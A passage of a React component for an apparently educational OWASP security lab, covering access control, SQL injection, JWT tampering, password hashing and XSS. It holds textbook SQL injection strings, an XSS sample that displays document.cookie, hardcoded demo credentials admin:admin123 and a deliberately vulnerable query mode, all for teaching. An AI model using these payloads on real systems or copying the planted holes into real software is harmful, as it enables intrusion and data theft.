                        notes.map((note) => (
                          <div key={note.id} className="p-3 bg-[#0f172a] border border-[#1e293b] rounded text-xs space-y-1 font-mono">
                            <div className="flex justify-between items-center text-[10px]">
                              <span className="text-emerald-400 font-bold">👤 {note.username}</span>
                              <span className="text-gray-500">
                                {new Date(note.createdAt).toLocaleTimeString()}
                              </span>
                            </div>
                            <p className="text-gray-300 leading-relaxed font-sans">{note.content}</p>
                          </div>
                        ))
                      )}
                    </div>
                  </div>

                  {/* ADMIN CLASSIFIED SECRETS (ROLE ACCESS CHECK) */}
                  <div className="bg-[#0a0f18] border border-[#1e293b] rounded p-5 space-y-4">
                    <div className="flex items-center justify-between border-b border-[#1e293b] pb-2">
                      <span className="font-mono text-xs text-rose-400 font-bold uppercase tracking-wide flex items-center gap-1.5">
                        <Lock className="w-4 h-4" /> classified credential vault (A01: Broken Access Control)
                      </span>
                      <span className="text-[10px] bg-rose-500/10 text-rose-300 border border-rose-500/20 px-2 py-0.5 rounded uppercase font-bold font-mono">
                        ADMIN CLEARANCE SPEC
                      </span>
                    </div>

                    {secretsError ? (
                      <div className="p-4 bg-rose-950/20 border border-rose-500/30 rounded flex gap-3 text-xs text-rose-300 font-mono">
                        <ShieldAlert className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
                        <div>
                          <h4 className="font-bold uppercase tracking-wider">{secretsError}</h4>
                          <p className="text-[11px] text-rose-400 mt-1 leading-normal">
                            This classified resource requires <strong>role="admin"</strong> on the decoded JWT payload signature. Log in using the <strong>admin:admin123</strong> fast credential shortcut to access.
                          </p>
                        </div>
                      </div>
                    ) : secrets.length > 0 ? (
                      <div className="space-y-2">
                        <div className="text-[11px] text-emerald-400 font-mono flex items-center gap-1 bg-emerald-500/10 py-1 px-2.5 border border-emerald-500/25 rounded">
                          <CheckCircle2 className="w-3.5 h-3.5 shrink-0" />
                          <span>JWT AUTHENTICATED: Permission granted! Viewing admin classified memory tuples.</span>
                        </div>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-1">
                          {secrets.map((item) => (
                            <div key={item.id} className="p-3 bg-[#131b2b] border border-[#1e293b] rounded space-y-1.5 font-mono text-xs">
                              <div className="flex justify-between items-center text-[10px]">
                                <span className="font-bold text-gray-400 truncate max-w-[130px]">{item.title}</span>
                                <span className="bg-red-500/10 text-red-400 border border-red-500/20 px-1 py-0.2 rounded font-mono text-[9px] uppercase font-bold">
                                  {item.classification}
                                </span>
                              </div>
                              <div className="bg-[#05070a] border border-[#131b2b] p-1.5 rounded font-mono text-[11px] text-[#38bdf8] overflow-x-auto select-all">
                                {item.content}
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    ) : (
                      <div className="text-center py-8 text-gray-500 font-mono text-xs border border-[#1e293b] border-dashed rounded">
                        Authorize login to load credentials Clearance level.
                      </div>
                    )}
                  </div>

                </div>

              </div>
            </div>
          )}

          {/* ACTIVE TAB: SQL INJECTION LABORATORY */}
          {activeTab === 'sql-lab' && (
            <div className="space-y-6">
              
              {/* INFORMATION HERO SECTION */}
              <div className="bg-[#080d16] border border-[#1e293b] p-5 rounded font-mono space-y-3">
                <div className="flex items-center gap-2">
                  <Database className="w-5 h-5 text-cyan-400 animate-pulse" />
                  <span className="text-sm font-bold text-white uppercase tracking-wider">OWASP A03: SQL Injection Simulation Lab</span>
                </div>
                <p className="text-xs text-[#94a3b8] leading-relaxed font-sans">
                  Relational engines parse query string statements by tokenizing keywords (<code>SELECT</code>, <code>WHERE</code>, <code>AND</code>, <code>OR</code>). When user text inputs are directly concatenated to form the query, structural symbols like quotes <code>'</code> modify the database compiler parser. This allows any user to construct logical statements that evaluate to <code>TRUE</code>, extracting arbitrary classified databases.
                </p>
              </div>

              {/* SPLIT EXPERIMENT PANEL */}
              <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                
                {/* CONTROL PANEL (5 cols) */}
                <div className="lg:col-span-4 bg-[#0a0f18] border border-[#1e293b] rounded p-5 space-y-4">
                  <span className="font-mono text-xs text-[#94a3b8] font-bold uppercase tracking-wider block border-b border-[#1e293b] pb-2">
                    💻 Lab Parameters Selector
                  </span>

                  <form onSubmit={handleRunSqlLab} className="space-y-4">
                    
                    {/* TOGGLE VULNERABLE/SECURE */}
                    <div className="space-y-2">
                      <label className="text-[10px] text-gray-400 block font-mono font-bold uppercase tracking-wider">
                        Select Pipeline Protection Mode
                      </label>
                      <div className="grid grid-cols-2 gap-2">
                        <button 
                          type="button" 
                          onClick={() => setSqlMode('vulnerable')}
                          className={`px-3 py-2 rounded text-xs font-mono font-semibold select-none text-center border transition-all duration-150 ${sqlMode === 'vulnerable' ? 'bg-amber-500/10 text-amber-400 border-amber-500/40 shadow-[0_0_8px_rgba(245,158,11,0.1)]' : 'bg-[#0f172a] text-[#94a3b8] border-[#1e293b] hover:bg-[#131b2b]'}`}
                        >
                          ⚠️ VULNERABLE (Concatenating)
                        </button>
                        <button 
                          type="button" 
                          onClick={() => setSqlMode('secure')}
                          className={`px-3 py-2 rounded text-xs font-mono font-semibold select-none text-center border transition-all duration-150 ${sqlMode === 'secure' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/40 shadow-[0_0_8px_rgba(16,185,129,0.1)]' : 'bg-[#0f172a] text-[#94a3b8] border-[#1e293b] hover:bg-[#131b2b]'}`}
                        >
                          🛡️ SECURED (Parameterized)
                        </button>
                      </div>
                    </div>

                    {/* SEARCH INPUT KEYWORD */}
                    <div className="space-y-1.5 font-mono text-xs">
                      <label className="text-[10px] text-gray-400 block font-bold uppercase tracking-wider">User Raw Input</label>
                      <input 
                        type="text"
                        value={sqlSearch}
                        onChange={(e) => setSqlSearch(e.target.value)}
                        className="w-full bg-[#05070a] border border-[#1e293b] rounded py-1.5 px-2.5 font-mono text-[#38bdf8] focus:outline-none focus:border-cyan-400"
                        placeholder="Search text"
                      />
                    </div>

                    {/* SHORTCUT PAYLOAD HELPER CLICKS */}
                    <div className="p-3 bg-[#0f172a] border border-[#1e293b] rounded space-y-2">
                      <span className="text-[9px] text-[#94a3b8] font-mono font-bold uppercase tracking-wider block">
                        💡 Test Payloads (Select to execute injection)
                      </span>
                      <div className="flex flex-col gap-1.5">
                        <button 
                          type="button" 
                          onClick={() => setSqlSearch("' OR '1'='1")}
                          className="bg-[#05070a] hover:bg-[#131b2b] p-1.5 rounded text-[10px] font-mono text-amber-300 text-left border border-[#1e293b] flex items-center justify-between"
                        >
                          <span>' OR '1'='1</span>
                          <span className="text-[8px] bg-amber-500/15 text-amber-400 font-bold px-1 rounded uppercase">All Records leak</span>
                        </button>
                        <button 
                          type="button" 
                          onClick={() => setSqlSearch("' OR 1=1--")}
                          className="bg-[#05070a] hover:bg-[#131b2b] p-1.5 rounded text-[10px] font-mono text-amber-300 text-left border border-[#1e293b] flex items-center justify-between"
                        >
                          <span>' OR 1=1--</span>
                          <span className="text-[8px] bg-amber-500/15 text-amber-400 font-bold px-1 rounded uppercase">Syntax bypass</span>
                        </button>
                        <button 
                          type="button" 
                          onClick={() => setSqlSearch("Penetration")}
                          className="bg-[#05070a] hover:bg-[#131b2b] p-1.5 rounded text-[10px] font-mono text-emerald-300 text-left border border-[#1e293b] flex items-center justify-between"
                        >
                          <span>Penetration</span>
                          <span className="text-[8px] bg-emerald-500/15 text-emerald-400 font-bold px-1 rounded uppercase">Normal search</span>
                        </button>
                      </div>
                    </div>

                    <button 
                      type="submit"
                      disabled={sqlLoading}
                      className="w-full bg-[#131b2b] hover:text-cyan-400 text-white border border-cyan-500/20 py-2 rounded text-xs font-mono font-bold flex items-center justify-center gap-1.5 transition-all"
                    >
                      {sqlLoading ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Search className="w-3.5 h-3.5 text-cyan-400" />}
                      Execute SQL Parsing Query
                    </button>
                  </form>
                </div>

                {/* DIAGNOSTIC MONITORING WINDOW (8 cols) */}
                <div className="lg:col-span-8 bg-[#0a0f18] border border-[#1e293b] rounded p-5 space-y-4">
                  <div className="flex items-center justify-between border-b border-[#1e293b] pb-2">
                    <span className="font-mono text-xs text-[#94a3b8] font-bold uppercase tracking-wide flex items-center gap-1.5">
                      <Terminal className="w-4 h-4 text-cyan-400" /> Relational SQL Compiler Engine Diagnostic Output
                    </span>
                    <span className={`px-2 py-0.5 rounded text-[9px] font-mono font-bold ${sqlMode === 'secure' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : 'bg-amber-500/10 text-amber-400 border border-amber-500/25'}`}>
                      MODE: {sqlMode.toUpperCase()}
                    </span>
                  </div>

                  {sqlResponse ? (
                    <div className="space-y-4 font-mono text-xs">
                      
                      {/* STATS */}
                      <div className="grid grid-cols-3 gap-3 p-3 bg-[#0f172a] border border-[#1e293b] rounded">
                        <div>
                          <span className="block text-[9px] text-[#475569] uppercase font-bold">Execution duration</span>
                          <span className="text-white text-xs">{sqlResponse.executionTimeMs} ms</span>
                        </div>
                        <div>
                          <span className="block text-[9px] text-[#475569] uppercase font-bold">Data rows returned</span>
                          <span className="text-white text-xs">{sqlResponse.results.length} rows</span>
                        </div>
                        <div>
                          <span className="block text-[9px] text-[#475569] uppercase font-bold">Compiler Parsing vulnerable</span>
                          <span className={`text-xs ${sqlResponse.results.length > 1 && sqlMode === 'vulnerable' ? 'text-rose-400 font-bold' : 'text-emerald-400 font-bold'}`}>
                            {sqlResponse.results.length > 1 && sqlMode === 'vulnerable' ? '⚠️ LEAK RISK HIGH' : '🛡️ SHIELDED'}
                          </span>
                        </div>
                      </div>

                      {/* QUERY SENT */}
                      <div className="space-y-1">
                        <span className="text-[10px] text-cyan-400 font-bold uppercase tracking-wider block">Parsed Query String</span>
                        <div className="bg-[#05070a] p-3 border border-[#1e293b] rounded text-[#38bdf8] overflow-x-auto select-all leading-normal text-[11px]">
                          {sqlResponse.query}
                        </div>
                        {sqlResponse.parameterizedQuery && (
                          <div className="text-[11px] text-emerald-400 space-y-1">
                            <span className="text-[9px] text-gray-500 font-bold uppercase tracking-wider block">Strict Bound Template schema:</span>
                            <code className="bg-[#05070a] block p-2 border border-[#1e293b] rounded">{sqlResponse.parameterizedQuery}</code>
                            <span className="text-[9px] text-gray-500 font-bold uppercase tracking-wider block">Bound literal arguments list:</span>
                            <code className="bg-[#05070a] block p-1.5 border border-[#1e293b] rounded">JSON.stringify({sqlResponse.paramsUsed})</code>
                          </div>
                        )}
                      </div>

                      {/* LIVE LOGS LOG */}
                      <div className="space-y-1">
                        <span className="text-[10px] text-cyan-400 font-bold uppercase tracking-wider block">Internal Engine Parsing Trace</span>
                        <div className="bg-[#05070a] p-3 border border-[#1e293b] rounded space-y-1 max-h-[140px] overflow-y-auto text-[11px]">
                          {sqlResponse.logs.map((logLine, idx) => (
                            <div key={idx} className={logLine.startsWith('[CRITICAL]') ? 'text-rose-400' : 'text-gray-400'}>
                              {`[${idx.toString().padStart(2, '0')}] ${logLine}`}
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* DB RESULTS ROWS */}
                      <div className="space-y-1">
                        <span className="text-[10px] text-cyan-400 font-bold uppercase tracking-wider block">Returned Secret Data Rows</span>
                        
                        <div className="bg-[#05070a] border border-[#1e293b] rounded overflow-hidden">
                          {sqlResponse.results.length === 0 ? (
                            <div className="p-4 text-center text-gray-500 text-[11px]">
                              Query completed with zero matches.
                            </div>
                          ) : (
                            <div className="divide-y divide-[#1e293b]">
                              {sqlResponse.results.map((row: any, rIdx) => (
                                <div key={rIdx} className="p-3 grid grid-cols-12 gap-2 hover:bg-[#0f172a]/50 text-[11px]">
                                  <div className="col-span-1 text-gray-500">ID:{row.id}</div>
                                  <div className="col-span-4 text-gray-200 font-bold">{row.title}</div>
                                  <div className="col-span-2">
                                    <span className="bg-red-500/10 text-red-400 border border-red-500/20 px-1 py-0.2 rounded text-[9px] font-bold">
                                      {row.classification}
                                    </span>
                                  </div>
                                  <div className="col-span-5 text-[#38bdf8] select-all truncate">{row.content}</div>
                                </div>
                              ))}
                            </div>
                          )}
                        </div>
                        {sqlResponse.results.length > 2 && sqlMode === 'vulnerable' && (
                          <div className="p-2.5 bg-red-950/20 border border-red-500/30 text-rose-300 rounded text-[11px] leading-relaxed mt-2">
                            <strong>⚠️ Security Breach Alert</strong>: The attacker bypassed the row clearances by causing the logic parser to return all elements inside the database. In a real environment, this exposes absolute raw passwords and customer information without permission checks.
                          </div>
                        )}
                      </div>

                    </div>
                  ) : (
                    <div className="text-center py-20 text-gray-500 border border-dashed border-[#1e293b] rounded font-mono text-xs">
                      Run the simulation query on the left console panel to see diagnostic output.
                    </div>
                  )}
                </div>

              </div>
            </div>
          )}

          {/* ACTIVE TAB: JWT TOKEN VAULT & BISECTOR LAB */}
          {activeTab === 'jwt-vault' && (
            <div className="space-y-6">
              
              {/* INFORMATION HERO SECTION */}
              <div className="bg-[#080d16] border border-[#1e293b] p-5 rounded font-mono space-y-3">
                <div className="flex items-center gap-2">
                  <Fingerprint className="w-5 h-5 text-emerald-400 animate-pulse" />
                  <span className="text-sm font-bold text-white uppercase tracking-wider">JWT Structure bisector & Tampering Laboratory</span>
                </div>
                <p className="text-xs text-[#94a3b8] leading-relaxed font-sans">
                  JSON Web Tokens are client-side credentials structured of three periods (<code>dot</code>) separating: Base64URL-encoded Header, JSON Payload, and HMACS-SHA256 Cryptographic Signature. Attackers can decode the payload on the client and change attributes (e.g. modify <code>"role": "user"</code> to <code>"role": "admin"</code>). However, because the server signs the token under a secure constant key secret, any tampering will break signature integrity checking!
                </p>
              </div>

              {/* SPLIT TAMPER PANEL */}
              <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                
                {/* DECODED JWT SEGMENTS EDITOR (7 cols) */}
                <div className="lg:col-span-7 bg-[#0a0f18] border border-[#1e293b] rounded p-5 space-y-4">
                  <div className="flex items-center justify-between border-b border-[#1e293b] pb-2">
                    <span className="font-mono text-xs text-[#94a3b8] font-bold uppercase tracking-wider flex items-center gap-1.5">
                      🛠️ Interactive Token segment encoder (Client-Side Representation)
                    </span>
                    <button 
                      onClick={regenerateJwtOnClient}
                      className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-semibold font-mono py-1 px-2.5 rounded hover:bg-emerald-500/20 transition-all flex items-center gap-1.5"
                    >
                      <RefreshCw className="w-3 h-3" /> Re-encode base64
                    </button>
                  </div>

                  <div className="space-y-4 text-xs font-mono">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      {/* HEADER EDITOR */}
                      <div className="space-y-1">
                        <div className="flex justify-between items-center">
                          <span className="text-[10px] text-rose-400 font-bold uppercase tracking-wider">Block 1: Header (Red)</span>
                          <span className="text-[9px] text-[#475569]">HMAC alg schema</span>
                        </div>
                        <textarea 
                          rows={4}
                          value={jwtHeaderJson}
                          onChange={(e) => setJwtHeaderJson(e.target.value)}
                          className="w-full bg-[#05070a] border border-[#1e293b] rounded p-2 text-[11px] text-rose-300 focus:outline-none focus:border-red-500 font-mono leading-normal"
                        />
                      </div>

                      {/* PAYLOAD EDITOR (TAMPER TARGET) */}
                      <div className="space-y-1">
                        <div className="flex justify-between items-center">
                          <span className="text-[10px] text-cyan-400 font-bold uppercase tracking-wider">Block 2: Payload (Blue)</span>
                          <span className="text-[9px] text-red-400 font-bold uppercase animate-pulse">← Change role to 'admin'!</span>
                        </div>
                        <textarea 
                          rows={4}
                          value={jwtPayloadJson}
                          onChange={(e) => setJwtPayloadJson(e.target.value)}
                          className="w-full bg-[#05070a] border border-[#1e293b] rounded p-2 text-[11px] text-cyan-300 focus:outline-none focus:border-cyan-400 font-mono leading-normal"
                        />
                      </div>
                    </div>

                    {/* SIGNATURE BLOCK DISPLAY */}
                    <div className="space-y-1">
                      <span className="text-[10px] text-emerald-400 font-bold uppercase tracking-wider block">Block 3: Signature HMAC (Green)</span>
                      <input 
                        type="text"
                        value={jwtSignatureInput}
                        onChange={(e) => setJwtSignatureInput(e.target.value)}
                        className="w-full bg-[#05070a] border border-[#1e293b] rounded py-1.5 px-3.5 text-[11px] text-emerald-300 hover:border-emerald-500 focus:outline-none focus:border-emerald-500 font-mono select-all"
                        placeholder="Signature Base64 String"
                      />
                    </div>

                    {/* FULL TOKEN INPUT FIELD */}
                    <div className="space-y-1.5 pt-3 border-t border-[#1e293b]/50">
                      <div className="flex justify-between items-center">
                        <span className="text-[10px] text-[#94a3b8] font-bold uppercase tracking-wider">Resultant Full Dot-Separated JWT Token</span>
                        {currentUser && (
                          <button 
                            onClick={() => {
                              if (sessionToken) {
                                setJwtTokenInput(sessionToken);
                                setJwtLogs(prev => [`[Client] Loaded user's active login session token.`, ...prev]);
                              }
                            }}
                            className="text-[9px] text-cyan-400 underline font-semibold font-mono"
                          >
                            Load active identity token
                          </button>
                        )}
                      </div>
                      <textarea
                        rows={3}
                        value={jwtTokenInput}
                        onChange={(e) => setJwtTokenInput(e.target.value)}
                        className="w-full bg-[#05070a] border border-[#1e293b] rounded p-2.5 text-[10px] leading-relaxed text-[#38bdf8] focus:outline-none focus:border-[#38bdf8] font-mono select-all"
                        placeholder="token1.token2.token3"
                      />
                    </div>
                  </div>
                </div>

                {/* VERIFICATION ENDPOINT MONITOR (5 cols) */}
                <div className="lg:col-span-5 bg-[#0a0f18] border border-[#1e293b] rounded p-5 space-y-4">
                  <span className="font-mono text-xs text-[#94a3b8] font-bold uppercase tracking-wider block border-b border-[#1e293b] pb-2">
                    🛡️ Server Verification Gateway
                  </span>

                  <div className="space-y-4 font-mono text-xs">
                    
                    {/* CUSTOM CRYPTO SECRET KEY */}
                    <div className="space-y-1.5">
                      <div className="flex justify-between items-center">
                        <label className="text-[10px] text-gray-400 block font-bold uppercase tracking-wider">Verification Secret Key</label>
                        <span className="text-[9px] text-[#475569]">Leave blank for default server secret</span>
                      </div>
                      <input 
                        type="password"
                        value={jwtCustomSecret}
                        onChange={(e) => setJwtCustomSecret(e.target.value)}
                        className="w-full bg-[#05070a] border border-[#1e293b] rounded py-1 px-2.5 text-[11px] focus:outline-none focus:border-emerald-500/80 font-mono text-[#38bdf8]"
                        placeholder="Internal server-side secret key"
                      />
                    </div>

                    <button 
                      onClick={handleVerifyJwtServer}
                      className="w-full bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 py-2 rounded text-xs font-mono font-bold flex items-center justify-center gap-1.5 transition-all"
                    >
                      <ShieldCheck className="w-4 h-4 text-emerald-400" /> Verify JWT Cryptography
                    </button>

                    {/* INTERACTIVE SERVER REPORT */}
                    {jwtVerificationResult && (
                      <div className="bg-[#0f172a] border border-[#1e293b] p-3 rounded space-y-2.5">
                        <span className="text-[9px] text-cyan-400 uppercase font-bold tracking-wider block">Verification Report</span>
                        
                        <div className="flex items-center gap-2">
                          <div className={`w-3 h-3 rounded-full ${jwtVerificationResult.isValid ? 'bg-emerald-500 animate-ping' : 'bg-red-500'}`}></div>
                          <span className={`text-[11px] font-bold ${jwtVerificationResult.isValid ? 'text-emerald-400' : 'text-red-400'}`}>
                            {jwtVerificationResult.isValid ? 'VALID CRYPTOGRAPHIC INTEGRITY' : 'TAMPERED / FAILED SIGNATURE!'}
                          </span>
                        </div>

                        <p className="text-[10px] text-gray-400 leading-normal italic">
                          {jwtVerificationResult.message}
                        </p>

                        <div className="pt-2 border-t border-[#1e293b] text-[10px] text-gray-300 space-y-1 leading-normal">
                          <p>
                            <strong>Extracted claims:</strong> {JSON.stringify(jwtVerificationResult.decoded.payload)}
                          </p>
                          {jwtVerificationResult.decoded.payload.role === 'admin' && !jwtVerificationResult.isValid && (
                            <p className="text-red-400 mt-1">
                              <strong>💡 Analysis:</strong> You modified the role claim to <strong>"admin"</strong>, but since you do not possess the server's private secret, you could not compute the correct matching signature. The server timing-safe compare rejected the access request instantly. This prevents Broken Access Control!
                            </p>
                          )}
                          {jwtVerificationResult.decoded.payload.role === 'admin' && jwtVerificationResult.isValid && (
                            <p className="text-emerald-400 mt-1">
                              <strong>💡 Analysis:</strong> You successfully signed an administrator token using the verified server credentials key! This demonstrates how JWT can safely authenticate identity permissions as a tamper-proof passport.
                            </p>
                          )}
                        </div>
                      </div>
                    )}

                    {/* LIVE VERIFICATION LOGGER */}
                    <div className="space-y-1">
                      <span className="text-[9px] text-[#475569] font-bold uppercase tracking-wider block">Lab Action Trace</span>
                      <div className="bg-[#05070a] p-3 border border-[#1e293b] rounded space-y-1 max-h-[140px] overflow-y-auto text-[10px] text-gray-500">
                        {jwtLogs.length === 0 ? (
                          <div className="italic">No transactions logged in current workspace session.</div>
                        ) : (
                          jwtLogs.map((log, lIdx) => (
                            <div key={lIdx}>{`> ${log}`}</div>
                          ))
                        )}
                      </div>
                    </div>

                  </div>
                </div>

              </div>
            </div>
          )}

          {/* ACTIVE TAB: PBKDF2 PASSWORD CRYPTOGRAPHIC LAB */}
          {activeTab === 'hash-lab' && (
            <div className="space-y-6">
              
              {/* INFORMATION HERO SECTION */}
              <div className="bg-[#080d16] border border-[#1e293b] p-5 rounded font-mono space-y-3">
                <div className="flex items-center gap-2">
                  <Lock className="w-5 h-5 text-purple-400 animate-pulse" />
                  <span className="text-sm font-bold text-white uppercase tracking-wider">OWASP A02: Salted Hash Key-Derivation Lab (PBKDF2)</span>
                </div>
                <p className="text-xs text-[#94a3b8] leading-relaxed font-sans">
                  Plain text password storage is a critical cryptographic failure. If a database is leaked, attackers can immediately execute reverse lookups on flat tables. To mitigate offline dictionary cracking, we salt passwords (to prevent precomputed rainbow-table lookups) and apply recursive stretching rounds like active PBKDF2 (Password-Based Key Derivation Function 2) or bcrypt.
                </p>
              </div>

              {/* SPLIT KEY EXP */}
              <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                
                {/* HASH CONFIG PANEL (4 cols) */}
                <div className="lg:col-span-4 bg-[#0a0f18] border border-[#1e293b] rounded p-5 space-y-4">
                  <span className="font-mono text-xs text-[#94a3b8] font-bold uppercase tracking-wider block border-b border-[#1e293b] pb-2">
                    ⚙️ Key Derivation Parameters
                  </span>

                  <form onSubmit={handleRunHashLab} className="space-y-4 text-xs font-mono">
                    
                    {/* INPUT PASSWORD */}
                    <div className="space-y-1">
                      <label className="text-[10px] text-gray-400 block font-bold uppercase tracking-wider">Plain Text Password Phrase</label>
                      <input 
                        type="text"
                        value={hashPasswordInput}
                        onChange={(e) => setHashPasswordInput(e.target.value)}
                        className="w-full bg-[#05070a] border border-[#1e293b] rounded py-1.5 px-2.5 font-mono text-[#38bdf8] focus:outline-none focus:border-purple-400"
                        placeholder="SecurePass123"
                      />
                    </div>

                    {/* ITERATION ROUNDS */}
                    <div className="space-y-1">
                      <div className="flex justify-between items-center">
                        <label className="text-[10px] text-gray-400 block font-bold uppercase tracking-wider">Recursive Iterations (Rounds)</label>
                        <span className="text-[9px] text-purple-300 font-bold">{hashIterations.toLocaleString()} rounds</span>
                      </div>
                      <input 
                        type="range"
                        min="100"
                        max="100000"
                        step="100"
                        value={hashIterations}
                        onChange={(e) => setHashIterations(Number(e.target.value))}
                        className="w-full accent-purple-500 bg-[#05070a] h-1 rounded cursor-pointer"
                      />
                      <div className="flex justify-between text-[9px] text-gray-500">
                        <span>100 rounds (Fast execution)</span>
                        <span>100k rounds (Slow/Defensive)</span>
                      </div>
                    </div>

                    {/* UNIQUE SALT VAL */}
                    <div className="space-y-1">
                      <div className="flex justify-between items-center">
                        <label className="text-[10px] text-gray-400 block font-bold uppercase tracking-wider">Salt Value (Hex Block)</label>
                        <button 
                          type="button"
                          onClick={() => {
                            const saltHex = Array.from({length: 16}, () => Math.floor(Math.random()*16).toString(16)).join('');
                            setHashSaltInput(saltHex);
                          }}
                          className="text-[9px] text-purple-400 underline"
                        >
                          Generate random salt
                        </button>
                      </div>
                      <input 
                        type="text"
                        value={hashSaltInput}
                        onChange={(e) => setHashSaltInput(e.target.value)}
                        className="w-full bg-[#05070a] border border-[#1e293b] rounded py-1.5 px-2.5 font-mono text-purple-400 focus:outline-none focus:border-purple-400"
                        placeholder="8bdf38c5"
                      />
                    </div>

                    <button 
                      type="submit"
                      disabled={hashLoading}
                      className="w-full bg-[#131b2b] hover:text-purple-400 text-white border border-purple-500/20 py-2 rounded text-xs font-mono font-bold flex items-center justify-center gap-1.5 transition-all"
                    >
                      {hashLoading ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Lock className="w-3.5 h-3.5 text-purple-400" />}
                      Derive Hashed Hex Key
                    </button>
                  </form>
                </div>

                {/* HASH CALC RESULT AND CRYPT ANALYSIS (8 cols) */}
                <div className="lg:col-span-8 bg-[#0a0f18] border border-[#1e293b] rounded p-5 space-y-4">
                  <span className="font-mono text-xs text-[#94a3b8] font-bold uppercase tracking-wider block border-b border-[#1e293b] pb-2">
                    📊 Cryptographic Key Derivation Analysis Diagnostic
                  </span>

                  {hashResult ? (
                    <div className="space-y-4 font-mono text-xs leading-normal">
                      
                      {/* STATS ROW */}
                      <div className="grid grid-cols-2 md:grid-cols-3 gap-3 p-3 bg-[#0f172a] border border-[#1e293b] rounded">
                        <div>
                          <span className="block text-[9px] text-gray-500 uppercase font-bold">Calculation Time</span>
                          <span className="text-white text-xs">{hashResult.durationMs} ms</span>
                        </div>
                        <div>
                          <span className="block text-[9px] text-gray-500 uppercase font-bold">SHA Hashing algorithm</span>
                          <span className="text-white text-xs">PBKDF2-HMAC-SHA512</span>
                        </div>
                        <div className="col-span-2 md:col-span-1">
                          <span className="block text-[9px] text-gray-500 uppercase font-bold">Entropy Protection Level</span>
                          <span className={`text-xs font-bold ${hashIterations >= 10000 ? 'text-emerald-400' : 'text-amber-400'}`}>
                            {hashIterations >= 10000 ? '🛡️ OWASP RECOMMENDED' : '⚠️ WEAK ITERATIONS'}
                          </span>
                        </div>
                      </div>

                      {/* STRETCHED HEX RESULT */}
                      <div className="space-y-1">
                        <span className="text-[10px] text-purple-400 font-bold uppercase tracking-wider block">Derived Password Hash (64-byte Digest)</span>
                        <div className="bg-[#05070a] p-3 border border-[#1e293b] rounded text-[#38bdf8] overflow-x-auto select-all leading-relaxed text-[11px] font-mono break-all">
                          {hashResult.hash}
                        </div>
                      </div>

                      {/* CRYPT LESSON AND FORMULAS */}
                      <div className="bg-[#131b2b] border border-purple-500/10 p-4 rounded text-xs space-y-2.5 text-gray-300 leading-relaxed font-sans">
                        <div className="flex items-center gap-1.5 font-mono text-[10px] font-bold text-purple-400 uppercase tracking-wider">
                          <Cpu className="w-4 h-4 text-purple-400 shrink-0" />
                          <span>Mathematical Analysis of Offline Brute-Forcing</span>
                        </div>
                        
                        <p className="text-[11px]">
                          {hashResult.explanation}
                        </p>

                        <div className="pt-2 border-t border-[#1e293b] text-[10px] font-mono space-y-1 text-gray-400">
                          <div><strong>Formula:</strong> Time to Crack = (Candidate Combinations) × (Iterations) × (Single Hashing Op duration)</div>
                          <div><strong>Salting logic:</strong> By using the unique string <code>"{hashResult.salt}"</code>, attackers cannot match this result against standard precomputed database tables (rainbow tables). They must run slow hashes for this salt value explicitly, preventing dictionary attacks.</div>
                        </div>
                      </div>

                    </div>
                  ) : (
                    <div className="text-center py-24 text-gray-500 border border-dashed border-[#1e293b] rounded font-mono text-xs">
                      Run the PBKDF2 stretching simulation on the left panel parameters to execute crypto math.
                    </div>
                  )}
                </div>

              </div>
            </div>
          )}

          {/* ACTIVE TAB: XSS INPUT SANITIZATION LAB */}
          {activeTab === 'xss-lab' && (
            <div className="space-y-6">
              
              {/* INFORMATION HERO SECTION */}
              <div className="bg-[#080d16] border border-[#1e293b] p-5 rounded font-mono space-y-3">
                <div className="flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-amber-400 animate-pulse" />
                  <span className="text-sm font-bold text-white uppercase tracking-wider">OWASP A03: Cross-Site Scripting (XSS) Sanitizer Lab</span>
                </div>
                <p className="text-xs text-[#94a3b8] leading-relaxed font-sans">
                  Cross-Site Scripting (XSS) occurs when malicious user scripts are injected into web pages and executed contextually in a victim's browser workspace. Sanitization transforms HTML control tokens (like <code>&lt;</code>, <code>&gt;</code>, <code>"</code>, <code>'</code>) into standard HTML reference codes, protecting the DOM from parser execution.
                </p>
              </div>

              {/* SPLIT XSS EXPERIMENT */}
              <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                
                {/* CONFIGURATOR CONTROLLER (5 cols) */}
                <div className="lg:col-span-5 bg-[#0a0f18] border border-[#1e293b] rounded p-5 space-y-4">
                  <span className="font-mono text-xs text-[#94a3b8] font-bold uppercase tracking-wider block border-b border-[#1e293b] pb-2">
                    📝 Malicious HTML Input Playground
                  </span>

                  <form onSubmit={handleRunXssLab} className="space-y-4 text-xs font-mono">
                    <div className="space-y-1.5">
                      <label className="text-[10px] text-gray-400 block font-bold uppercase tracking-wider">Raw Unsafe Code Payload</label>
                      <textarea 
                        rows={5}
                        value={xssInput}
                        onChange={(e) => setXssInput(e.target.value)}
                        className="w-full bg-[#05070a] border border-[#1e293b] rounded p-2.5 font-mono text-[#38bdf8] focus:outline-none focus:border-amber-500 leading-normal"
                        placeholder="e.g. <script>alert(1)</script>"
                      />
                    </div>

                    {/* SHORTCUT XSS SCRIPT SAMPLES */}
                    <div className="p-3 bg-[#0f172a] border border-[#1e293b] rounded space-y-2">
                      <span className="text-[9px] text-[#94a3b8] font-mono font-bold uppercase tracking-wider block">
                        👾 Typical XSS Attacks Payload Catalogue
                      </span>
                      <div className="flex flex-col gap-1.5">
                        <button 
                          type="button" 
                          onClick={() => setXssInput('<img src="invalid_image.jpg" onerror="alert(\'Stealing cookies: \' + document.cookie)" />')}
                          className="bg-[#05070a] hover:bg-[#131b2b] p-1.5 rounded text-[10px] font-mono text-amber-300 text-left border border-[#1e293b] flex items-center justify-between"
                        >
                          <span>Image onerror action</span>
